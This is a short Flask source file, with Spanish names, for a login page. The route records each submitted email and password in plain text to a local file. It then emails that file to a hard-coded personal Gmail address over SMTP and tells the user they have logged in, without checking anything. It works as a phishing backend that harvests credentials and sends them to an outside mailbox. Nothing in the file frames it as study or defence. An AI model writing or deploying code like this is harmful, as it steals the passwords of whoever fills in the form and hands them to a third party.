from flask import Blueprint, render_template, request, flash
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
import os
from dotenv import load_dotenv

auth = Blueprint("auth", __name__)


@auth.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("clave")

        lineas = [f"Correo: {email} \n", f"Clave: {password}\n", " \n"]

        with open("archivo.txt", "a") as archivo:
            archivo.writelines(lineas)

        enviar_correo_con_adjunto(
            destinatario="juanpablomontoyajpmv@gmail.com",
            asunto="Archivo adjunto desde Python",
            mensaje="Hola, te envío el archivo solicitado.",
            archivo_path="archivo.txt",
        )

        flash("Ha iniciado sesión")

    return render_template("ingresar.html")


load_dotenv()


def enviar_correo_con_adjunto(destinatario, asunto, mensaje, archivo_path):
    remitente = os.getenv("EMAIL_USER")
    password = os.getenv("EMAIL_PASS")

    msg = MIMEMultipart()
    msg["From"] = remitente
    msg["To"] = destinatario
    msg["Subject"] = asunto

    msg.attach(MIMEText(mensaje, "plain"))

    try:
        with open(archivo_path, "rb") as archivo:
            adjunto = MIMEApplication(
                archivo.read(), _subtype=os.path.splitext(archivo_path)[1][1:]
            )
            adjunto.add_header(
                "Content-Disposition",
                "attachment",
                filename=os.path.basename(archivo_path),
            )
            msg.attach(adjunto)
    except FileNotFoundError:
        print("Archivo no encontrado")
        return False

    try:
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(remitente, password)
            server.sendmail(remitente, destinatario, msg.as_string())
        print(f" Correo enviado a: {destinatario} \n")
        return True
    except Exception as e:
        print(f"Error: {e}")
        return False
